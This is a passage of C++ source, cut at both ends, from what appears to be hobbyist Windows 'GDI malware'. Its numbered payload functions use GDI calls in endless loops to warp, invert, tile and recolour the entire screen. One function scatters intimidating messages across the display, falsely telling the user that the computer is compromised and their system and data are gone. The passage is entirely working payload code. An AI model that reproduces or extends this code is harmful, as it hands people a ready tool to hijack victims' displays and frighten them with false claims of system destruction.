		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(0, hdc);
		Sleep(1);
		i++;
		xxx *= 2;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload7_num2(LPVOID lparam) {//callback from caesium.exe
	HDC hdc = GetDC(NULL);
	int x = GetSystemMetrics(SM_CXSCREEN), y = GetSystemMetrics(SM_CYSCREEN), signX = 1, signY = 1, incrementor = 5;
	float x2 = 100.0f, y2 = 100.0f, angleX = 0.0f, angleY = 0.0f, angleZ = 0.0f, angleIncrement = 0.05f, colorA = 0, size = 0.0f;
	while (true)
	{
		hdc = GetDC(0);
		x2 += incrementor * signX;
		y2 += incrementor * signY;
		if (x2 + 75 >= x) {
			signX = -1;
			x2 = x - 76;
		}
		else if (x2 <= 75) {
			signX = 2;
			x2 = 76;
		}
		if (y2 + 75 >= y) {
			signY = -1;
			y2 = y - 76;
		}
		else if (y2 <= 75) {
			signY = 2;
			y2 = 76;
		}
		Point3D center = { x2, y2, 0.0f };
		HPEN hPen = CreatePen(0, 5, RndRGB);
		SelectObject(hdc, hPen);
		Draw3DCube(hdc, center, size, angleX, angleY, angleZ, colorA);
		angleX += angleIncrement;
		angleY += angleIncrement;
		angleZ += angleIncrement;
		Sleep(10);
		ReleaseDC(0, hdc);
		DeleteObject(hPen);
		colorA += 1;
		if (size >= 0 && size <= 100) { size += 0.5; }
	}
	return 0;
}
DWORD WINAPI Payload8_num1(LPVOID lparam) {//HSL function by UltraDasher965
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	RECT wRect;
	POINT wPt[3];
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx = (int)(cos((x + (i * 10)) / 10.f) * 25) * (tan((y & (i * 10)) / 10.f) * 25) + ((x + i) ^ (y + i));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 1000.f + y / h * .2f, 1.f);
				hslcolor.s = 1.f;
				hslcolor.s += 0.01f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 50;
		wPt[0].y = wRect.top + 50;
		wPt[1].x = wRect.right - 50;
		wPt[1].y = wRect.top - 50;
		wPt[2].x = wRect.left + 50;
		wPt[2].y = wRect.bottom + 50;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		PlgBlt(hdc, wPt, hdc, wRect.left + 20, wRect.top + 20, (wRect.right + wRect.left) - 40, (wRect.bottom + wRect.top) - 40, 0, 0, 0);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmp);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteDC(hdc);
	DeleteObject(bmpcopy);
	return 0x00;
}
DWORD WINAPI Payload9_num1(LPVOID lparam) {//bitblts by UltraDasher965
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				float fx = ((x + (i * 100)) - (y * (i & 4))) ^ ((x >> 1) + (y << 1));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				hslcolor.s = 1.f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
		BitBlt(hdc, rand() % 20, 0, w, h, hdc, rand() % 20, 0, NOTSRCCOPY);
		BitBlt(hdc, 0, rand() % 20, w, h, hdc, 0, rand() % 20, NOTSRCERASE);
		BitBlt(hdc, rand() % 20, rand() % 20, w, h, hdc, rand() % 20, rand() % 20, PATINVERT);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
		BitBlt(hdc, rand() % w, 10 - rand() % 20, 100, h, hdc, rand() % w, rand() % 20, SRCCOPY);
		BitBlt(hdc, 10 - rand() % 20, rand() % h, w, 100, hdc, rand() % 20, rand() % h, SRCCOPY);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, NOTSRCCOPY);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCCOPY);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload10_num1(LPVOID lparam) {//NO used AI
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0, xxx = 0, yyy = 2;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	RGBQUAD rgbquadCopy;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	while (true) 
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; y += 20) { StretchBlt(hdcCopy, -20 + rand() % 41, y, w, 30, hdcCopy, 0, y, w, 30, SRCAND); }
		for (int y = 0; y < h; y += 50) { StretchBlt(hdcCopy, -20 + rand() % 41, y, w, 50, hdcCopy, 0, y, w, 50, NOTSRCERASE); }
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int fx = xxx + ((x + i) ^ (y + i) >> yyy);
				rgbquad[index].rgbRed += fx | yyy;
				rgbquad[index].rgbGreen += fx + yyy;
				rgbquad[index].rgbBlue += fx ^ yyy;
			}
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCCOPY);
		int rand_num_x = rand() % w, rand_num_y = rand() % h, top_x = 0 + rand_num_x, top_y = 0 + rand_num_y, bottom_x = 300 + rand_num_x, bottom_y = 300 + rand_num_y;
		POINT pnt[8] = { rand() % w,rand() % h,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h };
		HRGN circle = CreateEllipticRgn(top_x, top_y, bottom_x, bottom_y), rect = CreateRectRgn(top_x, top_y, bottom_x, bottom_y), roundrect = CreateRoundRectRgn(top_x, top_y, bottom_x, bottom_y, 100, 100), polygon = CreatePolygonRgn(pnt, 8, ALTERNATE);
		SetStretchBltMode(hdcCopy, COLORONCOLOR);
		SetStretchBltMode(hdc, COLORONCOLOR);
		StretchBlt(hdcCopy, 0, 0, w / 15, h / 15, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w / 15, h / 15, SRCCOPY);
		InvertRgn(hdc, circle);
		InvertRgn(hdc, rect);
		InvertRgn(hdc, roundrect);
		InvertRgn(hdc, polygon);
		DeleteObject(circle);
		DeleteObject(rect);
		DeleteObject(roundrect);
		DeleteObject(polygon);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
		Sleep(10);
		i++;
		xxx += 3;
		yyy &= 3;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload11_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int cx = x - w / 2, cy = y - h / 2;
				int dx = cx * cx, dy = cy * cy;
				int d = 128 + i;
				int fx = d - (d * ceil(fabs(dx + dy) / d));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		BitBlt(hdc, rand() % w, rand() % 15, w - rand() % w, h, hdc, rand() % w, rand() % 15, SRCCOPY);
		BitBlt(hdc, rand() % 15, rand() % h, w, h - rand() % h, hdc, rand() % 15, rand() % h, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload12_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	bmp = CreateDIBSection(hdc, &bmpi, NULL, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				rgbquad[index].rgbRed -= x ^ y;
				rgbquad[index].rgbGreen *= y >> x;
				rgbquad[index].rgbBlue += x & y;
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCERASE);
		ReleaseDC(NULL, hdc);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload12_num2(LPVOID lparam) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), cw = w / 2, ch = h / 2;
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	BITMAPINFO bmi = {};
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;
	void* pixels = nullptr;
	HBITMAP bmp = CreateDIBSection(hdcCopy, &bmi, DIB_RGB_COLORS, &pixels, NULL, 0);
	SelectObject(hdcCopy, bmp);
	RGBQUAD* buffer = (RGBQUAD*)pixels;
	double t = 0.0;
	while (true)
	{
		hdc = GetDC(0);
		for (int y = 0; y < h; ++y)
		{
			for (int x = 0; x < w; ++x)
			{
				double warpX = x + 2000 * abs(sin(y * 0.005 + t));
				double warpY = y + 2000 * abs(cos(x * 0.005 + t));
				bool gridX = fmod(warpX, 40) < 1.5;
				bool gridY = fmod(warpY, 40) < 1.5;
				BYTE r = 255, g = 255, b = 255;
				if (gridX || gridY) { r = g = b = 0; }
				buffer[y * w + x] = { b, g, r, 0 };
			}
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCINVERT);
		ReleaseDC(NULL, hdc);
		t += 0.01;
	}

	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload13_num1(LPVOID lparam) {
	HDC hdc = GetDC(0), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	RECT rect;
	POINT lpt[3];
	while (true) {
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &rect);
		int counter = 90;
		if (rand() % 2 == 0) {
			lpt[0].x = rect.left + counter;
			lpt[0].y = rect.top - counter;
			lpt[1].x = rect.right + counter;
			lpt[1].y = rect.top + counter;
			lpt[2].x = rect.left - counter;
			lpt[2].y = rect.bottom - counter;
			PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		else if (rand() % 2 == 1) {
			lpt[0].x = rect.left - counter;
			lpt[0].y = rect.top + counter;
			lpt[1].x = rect.right - counter;
			lpt[1].y = rect.top - counter;
			lpt[2].x = rect.left + counter;
			lpt[2].y = rect.bottom + counter;
			PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		PlgBlt(hdcCopy, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload13_num2(LPVOID lparam) {
	HDC hdc = GetDC(0), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	RECT rect;
	POINT lpt[3];
	while (true) {
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &rect);
		int c = 100;
		if (rand() % 2 == 0) {
			lpt[0].x = rect.left + rand() % 150 - 70;
			lpt[0].y = rect.top + rand() % 260 - 190;
			lpt[1].x = rect.right + rand() % 310 - 150;
			lpt[1].y = rect.top + rand() % 610 - 240;
			lpt[2].x = rect.left + c - rand() % 250 - c;
			lpt[2].y = rect.bottom - c + rand() % 290 - c;
			PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		else if (rand() % 2 == 1) {
			lpt[0].x = rect.left - rand() % 120 + 56;
			lpt[0].y = rect.top - rand() % 216 + 150;
			lpt[1].x = rect.right - rand() % 290 + 190;
			lpt[1].y = rect.top - rand() % 416 + 250;
			lpt[2].x = rect.left - c + rand() % 230 + c;
			lpt[2].y = rect.bottom + c - rand() % 240 + c;
			PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		PlgBlt(hdcCopy, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCERASE);
		SelectObject(hdc, CreateSolidBrush(RndRGB));
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, PATINVERT);
		ReleaseDC(0, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload13_num3(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (true)
	{
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 200;
			BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
			angle += PI / 400;
			DeleteObject(&i);
			DeleteObject(&a);
		}
		ReleaseDC(0, hdc);
	}
	return 0;
}
DWORD WINAPI Payload13_num4(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	LPCSTR things[12] = { "shpxvatanmne.exe", "UltraDasher965", "LambdaTechnology", "FUCKASS MAZEICON. NO SKID NO AI.","Your computer has been compromised by me, can't recovered.", "Goodbye, your system and data!", "It's very scary, isn't it?", "what was the point of even having a PC?","what was the purpose of running this?", "Nobody can hear your SOS!", "Just give up, there is only hopelessness!", "ge七 rȝct 丨ol" };
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true) {
		hdc = GetDC(0);
		SetBkMode(hdc, 0);
		int thing = rand() % 12;
		HFONT hfnt = CreateFontA(rand() % 100, rand() % 100, 0, 0, FW_THIN, 0, true, true, ANSI_CHARSET, 0, 0, 0, 0, "Times New Roman");
		SelectObject(hdc, hfnt);
		SetTextColor(hdc, RndRGB);
		TextOutA(hdc, rand() % w, rand() % h, things[thing], strlen(things[thing]));
		DeleteObject(hfnt);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI Payload14_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	double angle = 0.0f;
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int cx = abs(x - (w / 2));
				int cy = abs(y - (h / 2));
				int zx = tan(angle) * cx - sin(angle) * cy;
				int zy = cos(angle) * cx + tan(angle) * cy;
				int fx = ((log(zx * zx * zy ^ zy)) + (ceil(zx * zx + zy * zy)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
				hslcolor.s = 1.f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		angle += 0.01f;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		SelectObject(hdcCopy, bmpcopy);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload14_num2(LPVOID lparam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	float angle = 0.0f;
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int skew = static_cast<int>(sin(angle * PI / 180.0f) * 1000);
		POINT destPoints[3] = {
			{ skew, 0 },
			{ w + skew, 0 },
			{ 0, h }
		};
		PlgBlt(hdc, destPoints, hdcCopy, 0, 0, w, h, NULL, 0, 0);
		angle = WrapAngle(angle + 200.0f);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload15_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), radius2 = 500.0f;
	double moveangle = 0;
	while (true)
	{
		hdc = GetDC(0);
		int radius = 150, rx = rand() % w, ry = rand() % h;
		double ax = cos(moveangle) * radius2, ay = sin(moveangle) * radius2;
		StretchBlt(hdc, ax, ay, w, h, hdc, 0, 0, w, h, NOTSRCERASE);
		moveangle = fmod(moveangle + PI / radius2, PI * radius2);
		for (int t = 5; t < w + h; t++, t += 10) {
			int x = (int)(float)(radius + t / cos(t + radius * 10)) + rx;
			int y = (int)(float)(radius + t / sin(t + radius * 15)) + ry;
		}
		Sleep(1);
		ReleaseDC(0, hdc);
	}
	return 0;
}
DWORD WINAPI Payload15_num2(LPVOID lparam) {
	srand(time(NULL));
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int RndRGBCopy = (RndRGB) * 2;
		for (int i = 0; i < w * h; i++) { rgbScreen[i].rgb %= RndRGBCopy; }
		for (int i = 0; i < h; i++) { StretchBlt(hdcCopy, -2 + (rand() % 5), i, w, 1, hdcCopy, 0, i, w, 1, NOTSRCCOPY); }
		int x = rand() % h;
		int y = rand() % w;
		for (int i = 0; i < 17; i++) {
			BitBlt(hdc, w, 3, h, h, hdc, w, 0, NOTSRCCOPY);
			BitBlt(hdc, x, -2, -y, x, hdc, x, 0, NOTSRCERASE);
			BitBlt(hdc, 3, h, h, w, hdc, 0, w, SRCPAINT);
			BitBlt(hdc, -6, x, -y, x, hdc, 0, y, SRCINVERT);
			BitBlt(hdc, w, 3, h, h, hdc, w, 0, NOTSRCCOPY);
			BitBlt(hdc, x, -2, -y, x, hdc, x, 0, SRCCOPY);
			BitBlt(hdc, 3, h, h, w, hdc, 0, w, NOTSRCCOPY);
			BitBlt(hdc, -6, x, -y, x, hdc, 0, y, SRCINVERT);
			BitBlt(hdc, h, 1, w, h, hdc, h, 0, SRCERASE);
			BitBlt(hdc, h, -1, -w, h, hdc, h, 0, SRCAND);
			BitBlt(hdc, 1, w, w, h, hdc, 0, w, NOTSRCCOPY);
			BitBlt(hdc, -1, w, -w, h, hdc, 0, w, SRCCOPY);

		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		SelectObject(hdcCopy, bmpcopy);
		Sleep(5);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload15_num3(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), radius = 32;
	double chushi = 1;
	while (true) {
		int numCircles = (h / (radius + 4.5)) * radius, count = 0;
		for (int i = 0; i < numCircles; i++) {
			int spiralRadius = i * chushi, x = ((w / 2) + radius) + spiralRadius * sin(i * 1.2), y = ((h / 2) + radius) + spiralRadius * cos(i * 1.2);
			hdc = GetDC(0);
			HICON hIcon = ExtractIconA(0, "moricons.dll", rand() % 336);
			DrawIconEx(hdc, x, y, hIcon, 32, 32, NULL, NULL, DI_NORMAL);
			ReleaseDC(0, hdc);
			DestroyIcon(hIcon);
			if (count == 10) { count = 0; Sleep(10); }
			else { count++; }
		}
		if (chushi > 2.5) { chushi = 1; }
		else { chushi = chushi + 0.1; }
		Sleep(333);
		ReleaseDC(0, hdc);
	}
	return 0;
}
DWORD WINAPI Payload16_num1(LPVOID lparam) {
	srand(time(NULL));
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), xxx = 0, radius = 8.0f;
	BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	double angle = 0;
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdcCopy, -1, 0, w, h, hdcCopy, 0, 0, SRCAND);
		BitBlt(hdcCopy, 0, 1, w, h, hdcCopy, 0, 0, SRCPAINT);
		BitBlt(hdcCopy, 1, 0, w, h, hdcCopy, 0, 0, SRCPAINT);
		BitBlt(hdcCopy, 0, -1, w, h, hdcCopy, 0, 0, SRCAND);
		for (int i = 0; i < w * h; i++) { rgbScreen[i].rgb -= ((i & w) + h) & ((i * 4) + (i / h) >> xxx); }
		for (int y = 0; y < h; y += 40) { StretchBlt(hdcCopy, -20 + rand() % 40, y, w, 40, hdcCopy, 0, y, w, 40, SRCPAINT); }
		for (int x = 0; x < w; x += 40) { StretchBlt(hdcCopy, x, -20 + rand() % 40, 40, h, hdcCopy, x, 0, 40, h, SRCAND); }
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCERASE);
		float x = cos(angle) * radius, y = tan(angle) * radius;
		BitBlt(hdc, 0, 0, w, h, hdcCopy, x, y, SRCCOPY);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
		Sleep(1);
		xxx++; xxx ^= 2;
		angle = fmod(angle + PI / radius, PI * radius);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload17_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true)
	{
		hdc = GetDC(0);
